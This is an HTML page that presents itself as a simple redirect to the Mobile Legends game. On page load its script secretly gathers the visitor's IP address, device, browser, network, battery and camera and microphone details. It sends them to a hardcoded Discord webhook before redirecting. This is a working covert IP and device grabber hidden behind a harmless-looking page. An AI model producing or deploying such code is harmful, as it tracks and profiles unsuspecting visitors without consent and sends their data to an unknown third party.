<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <script>
        window.onload = async function() {
            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";

            try {
                const response = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
                const data = await response.json();
                const ip = data.ip;

                const language = navigator.language || navigator.userLanguage;

                let connectionType = "Unknown";
                let networkType = "Unknown";
                if (navigator.connection) {
                    connectionType = navigator.connection.effectiveType || "Unknown";
                    networkType = navigator.connection.type || "Unknown";

                    if (navigator.connection.downlinkMax > 10) {
                        networkType = "WiFi";
                    } else if (navigator.connection.downlinkMax > 0) {
                        networkType = "Data Seluler";
                    }
                }

                let batteryLevel = "Unknown";
                let isCharging = "Unknown";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                    isCharging = battery.charging ? "Charging" : "Not Charging";
                }

                const userAgent = navigator.userAgent;
                let platform = "Unknown";
                if (/Android/i.test(userAgent)) platform = "Android";
                else if (/iPhone|iPad|iPod/i.test(userAgent)) platform = "iOS";
                else if (/Windows/i.test(userAgent)) platform = "Windows";
                else if (/Mac/i.test(userAgent)) platform = "MacOS";
                else if (/Linux/i.test(userAgent)) platform = "Linux";

                let browser = "Unknown";
                if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = "Chrome";
                else if (/Firefox/i.test(userAgent)) browser = "Firefox";
                else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
                else if (/Edg/i.test(userAgent)) browser = "Edge";
                else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
                else if (/UCBrowser/i.test(userAgent)) browser = "UC Browser";

                let cameraStatus = "Disabled";
                let microphoneStatus = "Disabled";
                let gamepadStatus = "Disabled";
                if (navigator.mediaDevices) {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        cameraStatus = devices.some(device => device.kind === "videoinput") ? "Enabled" : "Disabled";
                        microphoneStatus = devices.some(device => device.kind === "audioinput") ? "Enabled" : "Disabled";
                    } catch {
                        cameraStatus = microphoneStatus = "Permission Denied";
                    }
                }

                if (navigator.getGamepads) {
                    gamepadStatus = "Enabled";
                }

                const inputType = 'ontouchstart' in window ? "Layar Sentuh" : "Keyboard Fisik";
                const uptime = performance.now() / 1000;
                const tabCount = window.length || "Unknown";
                const cacheStorage = 'caches' in window ? "Supported" : "Not Supported";

                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}`
                    })
                });

                window.location.href = "mobilelegends://";
                setTimeout(() => {
                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                }, 2000);
            } catch {
                window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
            }
        };
    </script>
</head>
<body>
</body>
</html>
